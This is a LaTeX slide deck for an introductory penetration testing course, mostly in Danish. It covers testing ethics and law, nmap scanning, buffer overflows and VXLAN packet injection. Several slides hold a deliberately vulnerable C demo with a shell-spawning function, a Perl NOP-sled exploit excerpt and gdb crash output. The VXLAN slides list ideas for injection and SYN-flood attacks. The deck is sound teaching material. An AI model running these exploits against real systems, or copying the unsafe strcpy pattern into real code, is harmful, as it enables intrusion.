\documentclass[Screen16to9,17pt]{foils}
%\documentclass[16pt,landscape,a4paper,footrule]{foils}
\usepackage{zencurity-slides}

% VXLAN Security or Injection
% BornHack 2018 regular talk


%
% Arrangement:	Penetration testing I - basale pentest metoder og introduktion
% Mål:	Introduktion til penetrationstest.
% Forudsætninger:	Der forventes kendskab til TCP/IP på brugerniveau.
% Beskrivelse:	Denne foredragsrække består af 4 uafhængige dele.

% Denne første del introducerer emnet penetrationstest, hvad er det og hvad
% er værdien for dig. Emner der gennemgås er blandt andet:

% * Regler og etik for penetrationstest
% * Informationsindsamling - aktiv og passiv
% * Portscan med nmap - TCP og UDP portscanning
% * Servicescanning - identifikation af porte og protokoller
% * Exploits og introduktion til buffer overflows
% * Bruteforcing online og offline værktøjer
% * Demonstration af værktøjer som Nmap, Metasploit og Armitage

% Der vil være demonstrationer af sårbarheder på alle foredragene -
% typisk med open source programmer, således at deltagerne kan afprøve
% de selvsamme demoer hjemme. Kursusrækken benytter Kali Linux fra Kali.org

% Note: der tages udgangspunkt i værktøjer som er open source og Linux/Unix, men resultater og principper kan overføres til alle typer pentest.

\begin{document}

%\rm
\selectlanguage{english}

\mytitlepage
{Penetration testing I\\Introduction to hacking and pentest methods}

\LogoOn

%\dagsplan


\slide{Goals for today}
\vskip 2 cm

%{\hlkbig En 3 dages workshop, hvor du lærer at angribe dit netværk!}
\hlkimage{3cm}{dont-panic.png}
\centerline{\color{titlecolor}\LARGE Don't Panic!}


\begin{list1}
\item Introduce the term penetration testing and basic pentest methods
\item Introduce some of the basic tools in this genre of hacker tools
\item Create an understanding of hacker tools
\item Show a hacker lab
\end{list1}


\slide{Hacker tools}

\begin{list1}
\item \emph{Improving the Security of Your Site by Breaking Into it}\\ by
Dan Farmer and Wietse Venema in 1993
\item Later in 1995 release the software SATAN\\
\emph{Security Administrator Tool for Analyzing Networks}
\item Caused some commotion, panic and discussions, every script kiddie can hack, the internet will melt down!
\vskip 5mm
\begin{quote}
We realize that SATAN is a two-edged sword -- like
many tools, it can be used for good and for evil
purposes. We also realize that intruders (including
wannabees) have much more capable (read intrusive)
tools than offered with SATAN.
\end{quote}
\end{list1}

\vskip 1cm
Source:
\link{http://www.fish2.com/security/admin-guide-to-cracking.html}


\slide{Use hacker tools!}

\begin{list1}
\item Port scan can reveal holes in your defense
\item Web testing tools can crawl through your site and find problems
\item Pentesting is a verification and proactively finding problems
\item Its not a silverbullet and mostly find known problems in existing systems
\item Combined with honeypots they may allow better security
\end{list1}


\slide{Hacker -- cracker}

{\bfseries Short answer -- dont discuss this}

%Det lidt længere svar:\\
Yes, originally there was another meaning to hacker, but the media has perverted it and today, and since early 1990s it has meant breaking into stuff for the public

{\color{red}\hlkbig Today a hacker breaks into systems!}

Reference. Spafford, Cheswick, Garfinkel, Stoll, \ldots
- wrote about this and it was lost

Story is interesting and the old meaning is ALSO used in smaller communities, like hacker spaces full of hackers - doing fun and interesting stuff
\begin{list2}
\item \emph{Cuckoo's Egg: Tracking a Spy Through the Maze of Computer
 Espionage},  Clifford Stoll
\item \emph{Hackers: Heroes of the Computer Revolution},
Steven Levy
\item \emph{Practical Unix and Internet Security},
Simson Garfinkel, Gene Spafford, Alan Schwartz
\end{list2}

\slide{Agreements for testing networks}

\begin{quote}\small
Danish Criminal Code\\
Straffelovens paragraf 263 Stk. 2. Med bøde eller fængsel indtil 1 år og 6 måneder straffes den, der uberettiget skaffer sig adgang til en andens oplysninger eller programmer, der er bestemt til at bruges i et informationssystem.
\end{quote}

Hacking can result in:
\begin{list2}
\item Getting your devices confiscated by the police
\item Paying damages to persons or businesses
\item If older getting a fine and a record -- even jail perhaps
\item Getting a criminal record, making it hard to travel to some countries and working in security
\item Fear of terror has increased the focus -- so dont step over bounds!
\end{list2}

Asking for permission and getting an OK before doing invasive tests, always!

\slide{ISC2 code of ethics}

\hlkimage{23cm}{isc2-code-of-ethics.png}

CISSP certified people sign papers to this extent.\\
\link{https://www.isc2.org/ethics/default.aspx}


\slide{Why even do security testing?}

\begin{list1}
\item Lots of security problems
\item Pentesting may be a requirement from external partners -- example VISA PCI standard
\end{list1}

\begin{list2}
\item Boss asking: should we do a security test?
\item CIO: hmm, okay
\item IT Admins: *sigh* -- I know the security sucks in places!
\item Its not your systems -- dont take the criticism personal, but as an opportunity to get things improved
\end{list2}

\vskip 2cm
\centerline{\Large Many see the benefits after doing a pentest, so try it!}

\slide{Blackbox, greybox og whitebox}

\begin{list2}
\item Forudsætninger og forudgående kendskab til miljøet
\item Black Box testen involverer en sikkerhedstestning af et netværk uden
nogen form for insider viden om systemet udover den IP-adresse, der
ønskes testet. Dette svarer til den situation en fjendtlig hacker vil
stå i og giver derfor det mest realistiske billede af netværkets
sårbarhed overfor angreb udefra. Men er dårlig ressourceudnyttelse.
\item I den anden ende  af skalaen har vi White Box testen. I dette tilfælde
har sikkerhedsspecialisten både før og under testen fuld adgang til
alle informationer om det scannede netværk. Analysen vil derfor kunne
afsløre sårbarheder, der ikke umiddelbart er synlige for en almindelig
angriber. En White Box test er typisk mere omfattende end en Black Box
test og forudsætter en højere grad af deltagelse fra kundens side, men
giver en meget detaljeret og tilbundsgående undersøgelse.

\item En Grey Box test er som navnet siger et kompromis mellem en White Box
og en Black Box test. Typisk vil sikkerhedsspecialisten udover en
IP-adresse være i besiddelse af de mest grundlæggende
systemoplysninger: Hvilken type af server der er tale om (mail-,
webserver eller andet), operativsystemet og eventuelt om der er
opstillet en firewall foran serveren.
\end{list2}


\slide{Benefits of having a planned security test done}

\begin{quote}
Goal of testing is to reduce risk for the systems and secure the organisation\\ from unexpected loss of data, image and increased costs.
\end{quote}

\begin{list1}
\item Målgrupper:
\begin{list2}
\item IT-afdeling og teknisk personale
\item Ledelse, koncernledelse
\item Eksterne revisorer, VISA PCI, offentligheden
\end{list2}
\item Afleveringer:
\begin{list2}
\item Rapport med tekniske anbefalinger og opsummering/checklister
\item Executive summary
\end{list2}
\end{list1}

Goal is not to find a scape goat to blame -- management allocates resources

If security is below in places more resources may be needed.


\slide{Planlægning af sikkerhedstest}

\begin{list1}
\item Sårbarhedsanalysens omfang aftales på forhånd
\begin{list2}
\item Scope -- hvad skal testes
\item Hvornår skal testes -- indenfor et aftalt tidsrum, wall clock time
\item Hvor testes fra -- logfilerne vil afsløre IP-adresser
\item Kan overskrides delvist -- eksempelvis ved port 80 scan på samme
  subnet eller tilsvarende
\item Skal der forsøges ude af drift angreb -- DoS
\item Se endvidere slide om Rules of engagement senere
\end{list2}
\item {\bf Sårbarhedsanalysen omfatter (targets):}
\begin{list2}
\item 192.168.1.1 -- firewall/router
\item 192.168.1.2 -- mailserver
\item 192.168.1.3 -- webserver
\item Testen udføres i tidsrummet mandag 1. til fredag 5.
\item Testere udfører \emph{angreb} fra 192.0.2.0/28
\end{list2}
\end{list1}


\slide{Afrapportering -- resultater}

\begin{list1}
\item Hvad indeholder en sikkerhedstest rapport:
\begin{list2}
\item Titel, indholdsfortegnelse, firmanavne -- ca. 15-30 sider for 5 hosts
\item Fortrolighedserklæring -- det er fortrolige oplysninger
\item Executive summary -- ofte i større virksomheder
\item Information om den udførte scanning
\item Omfang/scope
\item Gennemgang af targets -- detaljeret information og med anbefalinger
\item Konklusion -- ofte mere teknisk
\item Bilag -- detaljerede oplysninger og oversigter, checklister
\end{list2}
\item Det er organisationen der selv vælger hvilke anbefalinger der følges
\end{list1}


\slide{Rules of engagement -- regler og etik for sikkerhedstest}

\begin{list2}
\item NB: Stor forskel på Danmark og udlandet!
\item Sikkerhedskonsulenten må ikke give anledning til nye sårbarheder
  som følge af testen
\item Sikkerhedskonsulenten må ikke installere ny software på
  systemer uden forudgående aftale
\item Sikkerhedskonsulenten efterlader ikke usikre
  systemadministratorkonti eller tilsvarende efter testen
\item Sikkerhedskonsulenten tager altid kontakt til kunden ved
  høj-risiko sårbarheder
\item Er man hyret til netværkssikkerhed kan man godt \emph{snuse}
  lidt rundt om systemerne under test -- der kan være et sårbart
  testsystem lige ved siden af
\item Min holdning er at ved opdagelse af åbenlyse sikkerhedsrisici
  dokumenteres disse i rapporten, uanset scope for opgaven ellers
\end{list2}

\centerline{Det er en balancegang}



\slide{Konsulentens udstyr -- vil du være sikkerhedskonsulent}

\begin{list1}

\item Laptops, gerne flere, men én er nok til at lære!
\begin{list2}
\item Sikkerhedskonsulenterne bruger typisk Open Source værktøjer på Linux og
enkelte systemer med Windows -- jeg bruger helst Windows 7 i dag
\item Netværkserfaring \emph{TCP/IP protocol suite} -- TCP, UDP, ICMP osv. i detaljer
\item Programmmeringserfaring er en fordel
\item Linux/Unix kendskab er ofte en {\bfseries nødvendighed}\\
- fordi de nyeste værktøjer er skrevet til Unix i form af Linux og BSD
\item \emph{A Hands-On Introduction to Hacking
by Georgia Weidman}, June 2014\\ - ny version på vej!
 \link{http://www.nostarch.com/pentesting}

\end{list2}
\end{list1}


\slide{Hackerværktøjer}
% måske til reference afsnit?
\hlkimage{3cm}{hackers_JOLIE+1995.jpg}

\begin{list2}
\item Alle bruger nogenlunde de samme værktøjer, se også \link{http://www.sectools.org/}
\item Portscanner Nmap, Nping -- tester porte, godt til firewall admins \link{https://nmap.org}
\item Generel sårbarhedsscanner Metasploit Framework \link{https://www.metasploit.com/}
\item Specielle scannere -- wifi Aircrack-ng, web Burpsuite, Nikto, Skipfish \link{http://portswigger.net/burp/}
\item Wireshark avanceret netværkssniffer -- \link{https://www.wireshark.org/}
\item og scripting, PowerShell, Unix shell, Perl, Python, Ruby, \ldots
\end{list2}

Billedet: Angelina Jolie fra Hackers 1995


\slide{Hvad skal der ske?}

\begin{list1}
\item Tænk som en hacker
\item Rekognoscering
\begin{list2}
\item ping sweep, port scan
\item OS detection -- TCP/IP eller banner grab
\item Servicescan -- rpcinfo, netbios, ...
\item telnet/netcat interaktion med services
\end{list2}
\item Udnyttelse/afprøvning: Metasploit, Nikto, exploit programs
\item Oprydning/hærdning vises måske ikke, men I bør i praksis:
\begin{list2}
\item Lav en rapport
\item Ændre, forbedre og hærde systemer
\item Gennemgå rapporten, registrer ændringer
\item Opdater programmer, konfigurationer, arkitektur, osv.
\end{list2}
\item I skal jo også VISE andre at I gør noget ved sikkerheden.
\end{list1}


\slide{Hackerlab opsætning}

\hlkimage{8cm}{hacklab-1.png}

\begin{list2}
\item Hardware: en moderne laptop med CPU der kan bruge virtualisering\\
Husk at slå virtualisering til i BIOS
\item Software: dit favoritoperativsystem, Windows, Mac, Linux
\item Virtualiseringssoftware: VMware, Virtual box, vælg selv
\item Hackersoftware: Kali som Virtual Machine \link{https://www.kali.org/}
\item Soft targets: Metasploitable, Windows 2000, Windows XP, ...
\end{list2}


\slide{Teknisk hvad er hacking}

\hlkimage{12cm}{buffer-overflow-3.pdf}


\slide{Internet i dag}

\hlkimage{10cm}{images/server-client.pdf}

\begin{list1}
\item Klienter og servere
\item Rødder i akademiske miljøer
\item Protokoller der er op til 20 år gamle
\item Meget lidt kryptering, mest på http til brug ved e-handel
\end{list1}

\slide{Trinity breaking in}

\hlkimage{14cm}{trinity-nmapscreen-hd-cropscale-418x250.jpg}
Meget realistisk - sådan foregår det næsten:\\
\link{https://nmap.org/movies/}\\
\link{https://youtu.be/51lGCTgqE_w}



\slide{Hacking er magi}

\hlkimage{5cm}{wizard_in_blue_hat.png}

\vskip 1 cm

\centerline{Hacking ligner indimellem  magi}


\slide{Hacking er ikke magi}

\hlkimage{15cm}{ninjas.png}

\vskip 1 cm
\centerline{Hacking kræver blot lidt ninja-træning}

\slide{OSI og Internet modellerne}

\hlkimage{10cm,angle=90}{images/compare-osi-ip.pdf}

\slide{Kali Linux the pentest toolbox}

\hlkimage{14cm}{kali-linux.png}

\begin{list1}
\item  Kali \link{http://www.kali.org/}
\item 100.000s of videos on youtube alone, searching for kali and \$TOOL
\item Also versions for Raspberry Pi, mobile and other small computers
\end{list1}

\slide{Really do Nmap your world}

\hlkimage{8cm}{nmap-zenmap.png}

\begin{list2}
\item Nmap is a port scanner, but does more
\item Finding your own infrastructure available from the guest network?
\item See your printers having all the protocols enabled AND a wireless?
\end{list2}

\slide{Network mapping}

\hlkimage{13cm}{images/network-example.pdf}

\begin{list1}
\item Ved brug af traceroute og tilsvarende programmer kan man ofte
  udlede topologien i det netværk man undersøger
\item Levetiden (TTL) for en pakke tælles ned på hver router, sættes denne lavt
  opnår man at pakken \emph{timer ud} -- besked fra hver router på vejen
\item Default Unix er UDP pakker, Windows tracert ICMP pakker
\end{list1}


\slide{traceroute -- med UDP}

\begin{alltt}
\footnotesize # {\bfseries tcpdump -i en0 host 10.20.20.129 or host 10.0.0.11}
tcpdump: listening on en0
23:23:30.426342 10.0.0.200.33849 > router.33435: udp 12 {\bf [ttl 1]}
23:23:30.426742 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.436069 10.0.0.200.33849 > router.33436: udp 12 {\bf [ttl 1]}
23:23:30.436357 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.437117 10.0.0.200.33849 > router.33437: udp 12 {\bf [ttl 1]}
23:23:30.437383 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.437574 10.0.0.200.33849 > router.33438: udp 12
23:23:30.438946 router > 10.0.0.200: icmp: router {\bf udp port 33438 unreachable}
23:23:30.451319 10.0.0.200.33849 > router.33439: udp 12
23:23:30.452569 router > 10.0.0.200: icmp: router {\bf udp port 33439 unreachable}
23:23:30.452813 10.0.0.200.33849 > router.33440: udp 12
23:23:30.454023 router > 10.0.0.200: icmp: router {\bf udp port 33440 unreachable}
23:23:31.379102 10.0.0.200.49214 > safri.domain:  6646+ PTR?
200.0.0.10.in-addr.arpa. (41)
23:23:31.380410 safri.domain > 10.0.0.200.49214:  6646 NXDomain* 0/1/0 (93)
14 packets received by filter
0 packets dropped by kernel
\end{alltt}


\slide{Basal Portscanning}

\begin{list1}
\item Hvad er portscanning
\item Afprøvning af alle porte fra 0/1 og op til 65535
\item Målet er at identificere åbne porte -- sårbare services
\item Typisk TCP og UDP scanning
\item TCP scanning er ofte mere pålidelig end UDP scanning
\item TCP handshake er nemmere at identificere, skal svare SYN
\item UDP applikationer svarer forskelligt -- hvis overhovedet\\
Svarer på rigtige forespørgsler, uden firewall svares ICMP på lukkede porte
\item Brug GUI programmet Zenmap mens i lærer Nmap at kende
\end{list1}


\slide{TCP three-way handshake}

\hlkimage{5cm}{images/tcp-three-way.pdf}

\begin{list2}
\item {\bfseries TCP SYN half-open} scans
\item Tidligere loggede systemer kun når der var etableret en fuld TCP
  forbindelse\\
  -- dette kan/kunne udnyttes til \emph{stealth}-scans
\item Hvis en maskine modtager mange SYN pakker kan dette fylde
  tabellen over connections op -- og derved afholde nye forbindelser
  fra at blive oprette -- {\bfseries SYN-flooding}
\end{list2}


\slide{Ping og port sweep}

\begin{list1}
\item Scanninger på tværs af netværk kaldes for sweeps
\item Scan et netværk efter aktive systemer med PING
\item Scan et netværk efter systemer med en bestemt port åben
\item Er som regel nemt at opdage:
  \begin{list2}
    \item konfigurer en maskine med to IP-adresser som ikke er i brug
\item hvis der kommer trafik til den ene eller anden er det portscan
\item hvis der kommer trafik til begge IP-adresser er der nok
  foretaget et sweep -- bedre hvis de to adresser ligger et stykke fra hinanden
  \end{list2}

\vskip 2cm
Pro tip: Hvis du leder efter et Netværks IDS, så kig på Suricata \link{suricata-ids.org}
\end{list1}

\slide{Nmap port sweep efter webservere}

\begin{alltt}\small
root@cornerstone:~#{\bfseries  nmap -p80,443 172.29.0.0/24}

Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:31 CET
Nmap scan report for 172.29.0.1
Host is up (0.00016s latency).
PORT    STATE    SERVICE
{\color{darkgreen}80/tcp  open     http}
443/tcp filtered https
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 172.29.0.138
Host is up (0.00012s latency).
PORT    STATE  SERVICE
{\color{darkgreen}80/tcp  open   http}
443/tcp closed https
MAC Address: 00:0C:29:46:22:FB (VMware)

\end{alltt}

\slide{Nmap port sweep efter SNMP port 161/UDP}

\begin{alltt}\small
root@cornerstone:~#{\bfseries nmap -sU -p 161 172.29.0.0/24}
Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:30 CET
Nmap scan report for 172.29.0.1
Host is up (0.00015s latency).
PORT    STATE         SERVICE
{\color{darkgreen}161/udp open|filtered snmp}
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 172.29.0.138
Host is up (0.00011s latency).
PORT    STATE  SERVICE
{\bf{161/udp closed snmp}}
MAC Address: 00:0C:29:46:22:FB (VMware)
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.18 seconds
\end{alltt}

\slide{Nmap Advanced OS detection}
\begin{alltt}\footnotesize
root@cornerstone:~#{\bfseries nmap -A -p80,443 172.29.0.0/24}
Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:37 CET
Nmap scan report for 172.29.0.1
Host is up (0.00027s latency).
PORT    STATE    SERVICE VERSION
80/tcp  open     http    Apache httpd 2.2.26 ((Unix) DAV/2 mod_ssl/2.2.26 OpenSSL/0.9.8zc)
|_http-title: Site doesn't have a title (text/html).
443/tcp filtered https
MAC Address: 00:50:56:C0:00:08 (VMware)
Device type: media device|general purpose|phone
Running: Apple iOS 6.X|4.X|5.X, Apple Mac OS X 10.7.X|10.9.X|10.8.X
OS details: Apple iOS 6.1.3, Apple Mac OS X 10.7.0 (Lion) - 10.9.2 (Mavericks)
or iOS 4.1 - 7.1 (Darwin 10.0.0 - 14.0.0), Apple Mac OS X 10.8 - 10.8.3 (Mountain Lion)
or iOS 5.1.1 - 6.1.5 (Darwin 12.0.0 - 13.0.0)
OS and Service detection performed.
Please report any incorrect results at http://nmap.org/submit/
\end{alltt}

\begin{list2}
\item Lavniveau måde at identificere operativsystemer på, prøv også
  \verb+nmap -A+
\item Send pakker med \emph{anderledes} indhold, observer svar
\item En tidlig og detaljeret reference: \emph{ICMP Usage In Scanning} Version 3.0,
  Ofir Arkin, 2001 %\link{https://web.archive.org/web/20050210093427/http://www.sys-security.com/html/projects/icmp.html} % Original side er død
\end{list2}


\slide{Buffer overflows et C problem}

\begin{list1}
\item {\bfseries Et buffer overflow}
er det der sker når man skriver flere data end der er afsat plads til
i en buffer, et dataområde. Typisk vil programmet gå ned, men i visse
tilfælde kan en angriber overskrive returadresser for funktionskald og
overtage kontrollen.
\item {\bfseries Stack protection}
er et udtryk for de systemer der ved hjælp af operativsystemer,
programbiblioteker og lign. beskytter stakken med returadresser og
andre variable mod overskrivning gennem buffer overflows. StackGuard
og Propolice er nogle af de mest kendte.
\end{list1}

\slide{Buffers and stacks, simplified}

\hlkimage{18cm}{buffer-overflow-1.pdf}

\begin{alltt}\small
main(int argc, char **argv)
\{      char buf[200];
        strcpy(buf, argv[1]);
        printf("%s\textbackslash{}n",buf);
\}
\end{alltt}

\slide{Overflow -- segmentation fault}

\hlkimage{18cm}{buffer-overflow-2.pdf}


\begin{list2}
\item Bad function overwrites return value!
\item Control return address
\item Run shellcode from buffer, or from other place
\end{list2}


\slide{Exploits -- udnyttelse af sårbarheder}

\begin{list2}
\item Exploit/exploitprogram er udnytter en sårbarhed rettet mod et specifikt system.
\item Kan være 5 linier eller flere sider ofte Perl, Python eller et C program
\end{list2}

Eksempel demo i Perl, uddrag:
\begin{alltt}\footnotesize
$buffer = "";
$null = "\textbackslash{}x00";
$nop = "\textbackslash{}x90";

$nopsize = 1;
$len = 201; // what is needed to overflow, maybe 201, maybe more!
$the_shell_pointer = 0x01101d48; // address where shellcode is
# Fill buffer
for ($i = 1; $i < $len;$i += $nopsize) \{
    $buffer .= $nop;
\}
$address = pack('l', $the_shell_pointer);
$buffer .= $address;
exec "$program", "$buffer";
\end{alltt}


\slide{Hvordan finder man buffer overflow, og andre fejl}

\begin{list1}
\item Black box testing
\item Closed source reverse engineering
\item White box testing
\item Open source betyder man kan læse og analysere koden
\item Source code review -- automatisk eller manuelt
\item Fejl kan findes ved at prøve sig frem -- fuzzing
\item Exploits virker typisk mod specifikke versioner af software
\end{list1}


\slide{Privilegier least privilege}

\begin{list1}
\item Hvorfor afvikle applikationer med administrationsrettigheder -
  hvis der kun skal læses fra eksempelvis en database?
\item {\bfseries Least privilege}
betyder at man afvikler kode med det mest
restriktive sæt af privileger -- kun lige nok til at
opgaven kan udføres
\item Dette praktiseres sjældent i webløsninger i Danmark
\end{list1}

\slide{Privilegier privilege escalation}
\begin{list1}
\item {\bfseries Privilege escalation} er når man på en eller anden vis
opnår højere privileger på et system, eksempelvis som
følge af fejl i programmer der afvikles med højere
privilegier. Derfor HTTPD servere på Unix afvikles som
nobody -- ingen specielle rettigheder.
\item En angriber der kan afvikle vilkårlige kommandoer kan ofte finde
  en sårbarhed som kan udnyttes lokalt -- få rettigheder = lille skade
\end{list1}

Eksempel: man finder exploit som giver kommandolinieadgang til et system
som almindelig bruger

Ved at bruge en local exploit, Linuxkernen kan man måske forårsage fejl
og opnå root, GNU Screen med SUID bit eksempelvis


\slide{Local vs. remote exploits}

\begin{list1}
\item {\bfseries Local vs. remote}
angiver om et exploit er rettet mod
en sårbarhed lokalt på maskinen, eksempelvis
opnå højere privilegier, eller beregnet
til at udnytter sårbarheder over netværk
\item {\bfseries Remote root exploit}
- den type man frygter mest, idet
det er et exploit program der når det afvikles giver
angriberen fuld kontrol, root user er administrator
på Unix, over netværket.
\item {\bfseries Zero-day exploits} dem som ikke offentliggøres -- dem
  som hackere holder for sig selv. Dag 0 henviser til at ingen kender
  til dem før de offentliggøres og ofte er der umiddelbart ingen
  rettelser til de sårbarheder
\end{list1}




\slide{Insecure programming buffer overflows 101}


\begin{list2}
\item Small demo program \verb+demo.c+, try on older Linux
\item Has built-in shell code
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{alltt}\small
main(int argc, char **argv)
\{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\textbackslash{}n",buf);
\}
the_shell()
\{  system("/bin/sh");  \}
\end{alltt}


\slide{GDB GNU Debugger}

\begin{list1}
\item GNU compileren og debuggeren fungerer ok, men check andre!
\item Prøv \verb+gdb ./demo+ og kør derefter programmet fra \emph{gdb prompten}
med  \verb+run 1234+
\item Når I således ved hvor lang strengen skal være kan I fortsætte
  med \verb+nm+ kommandoen -- til at finde adressen på
  \verb+the_shell+\\
Skriv \verb+nm demo | grep shell+

\item Kunsten er således at generere en streng der er præcist så lang
  at man får lagt denne adresse ind på det \emph{rigtige sted}.
\item Perl kan erstatte AAAAA således \verb+`perl -e "print 'A'x10"`+
\end{list1}


\slide{Debugging af C med GDB}

\begin{list1}
\item Afprøvning med diverse input
\begin{list2}
\item \verb+./demo langstrengsomgiverproblemerforprogrammethvorformon+
\item \verb+gdb demo+ efterfulgt af run med parametre\\
\verb+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAA+
\end{list2}
\end{list1}

{\bfseries Hjælp:}\\
Kompiler programmet og kald det fra kommandolinien med
\verb+./demo 123456...7689+ indtil det dør ... derefter prøver I det
samme i GDB

Hvad sker der? Avancerede brugere kan ændre
\verb+strcpy+ til \verb+strncpy+


\slide{GDB output}

\begin{alltt}
\small
hlk@bigfoot:demo$ gdb demo
GNU gdb 5.3-20030128 (Apple version gdb-330.1) (Fri Jul 16 21:42:28 GMT 2004)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "powerpc-apple-darwin".
Reading symbols for shared libraries .. done
(gdb) {\bf run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
Starting program: /Volumes/userdata/projects/security/exploit/demo/demo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Reading symbols for shared libraries . done
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal EXC_BAD_ACCESS, Could not access memory.
{\bf 0x41414140} in ?? ()
(gdb)
\end{alltt}



\slide{Forudsætninger}

\begin{list1}
\item Bemærk: alle angreb har forudsætninger for at virke
\item Et angreb mod Telnet virker kun hvis du bruger Telnet
\item Et angreb mod Apache HTTPD virker ikke mod Microsoft IIS
\item Som forsvarer: Kan du bryde kæden af forudsætninger har du vundet!
\item Eksempler på forudsætninger:
\item Computeren skal være tændt, Funktionen der misbruges skal være slået til, Executable stack, Executable heap, Fejl i programmet
\end{list1}

\vskip 2cm

\centerline{\color{titlecolor}\LARGE \bf alle programmer har fejl}



\slide{Gode operativsystemer}

\begin{list1}
\item Nyere versioner af Microsoft Windows, Mac OS X og Linux distributionerne inkluderer:
\begin{list2}
\item Buffer overflow protection
\item Stack protection, non-executable stack
\item Heap protection, non-executable heap
\item \emph{Randomization of parameters} stack gap m.v.
\item ... en masse mere
\end{list2}
\item Vælg derfor hellere:
\begin{list2}
\item Windows 7/8/10, fremfor Windows XP
\item Mac OS X 10.11 fremfor 10.8
\item Linux sikkerhedsopdateringer, sig ja når de kommer
\end{list2}
\item Det samme gælder for serveroperativsystemer
\item NB: Meget få indlejrede systemer har beskyttelse! Internet of Thrash
\end{list1}

\slide{Defense in depth - multiple layers of security}

\hlkimage{5cm}{security-layers-1.pdf}

\centerline{Forsvar dig selv med flere lag af sikkerhed! }


\slide{Undgå standard indstillinger}

\begin{list1}
\item Når vi scanner efter services går det nemt med at finde dem
\item Giv jer selv mere tid til at omkonfigurere og opdatere ved at undgå standardindstillinger
\item Tiden der går fra en sårbarhed annonceres på internet til den
  bliver udnyttet er meget kort i dag! Timer!
\item Ved at undgå standard indstillinger kan der
  måske opnås en lidt længere frist -- inden ormene kommer
\item NB: Ingen garanti -- og det hjælper sjældent mod en dedikeret angriber
\item Dårlige passwords og konfigurationsfejl -- ofte overset
\end{list1}



\slide{The Exploit Database -- dagens buffer overflow}

\hlkimage{13cm}{exploit-db.png}

\centerline{\link{http://www.exploit-db.com/}}

\slide{Metasploit and Armitage Still rocking the internet}


\hlkimage{14cm}{metasploit-about.png}

\begin{list1}

\item \link{http://www.metasploit.com/}
\item Armitage GUI fast and easy hacking for Metasploit\\
\link{http://www.fastandeasyhacking.com/}\\
\link{http://www.offensive-security.com/metasploit-unleashed/Main_Page}
\end{list1}

\slide{Demo: Scapy pakker }

\hlkimage{21cm}{vxlan-basic.png}

Taking an excerpt from my talk on TROOPERS19\\
{\footnotesize\link{https://github.com/kramse/security-courses/tree/master/presentations/network/vxlan-troopers19}}

\slide{Overview VXLAN RFC7348 2014}

\hlkimage{18cm}{vxlan-basic.png}

How does it work?

\begin{list2}
\item Router 1 takes Layer 2 traffic, encapsulates with IP+UDP port 4789, routes
\item Router 2 receives IP+UDP+data, decapsulates, forward/switches layer 2 onto VLAN
\item Hosts 10.0.0.10 can talk to 10.0.0.20 as if they where next to each other in switch
\item Most often VLAN IEEE 802.1q involved too, but not shown
%\item Lets only consider two routers
\end{list2}

%\centerline{Quite easy to get a working lab with Linux or OpenBSD \smiley}

\slide{But what about security}

VXLAN does not by itself provide ANY security,
none, zip, nothing, nada! \\
No confidentiality. No integrity protection.

\vskip 5mm

Ways to protect:
\begin{list2}
\item Just configure the firewall, router ACL, etc - does not really work
\item Just isolate so no-one from the outside can send traffic, BCP38 please
\item Then what about from inside your data center, from partners, your servers
\end{list2}

\vskip 1cm
{\Large We currently have huge gaps in understanding these\\
issues - and missing security tool coverage}


\slide{VXLAN injection}

\hlkimage{19cm}{vxlan-basic-injection.png}

I tested using my pentest server in one AS, sending across an internet exchange into a production network, towards Arista testing devices - no problems, it's just routed layer 3 IP+UDP packets

\slide{Example attacks, What is possible VXLAN Header}

\begin{alltt}\footnotesize
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|R|R|R|R|I|R|R|R|            Reserved                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                VXLAN Network Identifier (VNI) |   Reserved    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
Inner Ethernet Header:
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             Inner Destination MAC Address                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Inner Destination MAC Address | Inner Source MAC Address      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                Inner Source MAC Address                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|OptnlEthtype = C-Tag 802.1Q    | Inner.VLAN Tag Information    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
\end{alltt}

\begin{list2}
\item Inject ARP traffic, send arbitrary ARP packets to hosts, connectivity DoS
\item Inject TCP like SYN traffic behind the firewall, wire speed SYN flooding
\item Inject UDP packets and get responses sent out through firewall\\
Really anything IPv4 and IPv6 can be injected
\end{list2}


\slide{Example: Send UDP DNS reqs to inside server}

\hlkimage{20cm}{vxlan-basic-injection-dns.pdf}

%One interesting attack is injecting UDP packets to allow DNS\\
%requests to inside server which might not even have public IP

%\begin{enumerate}
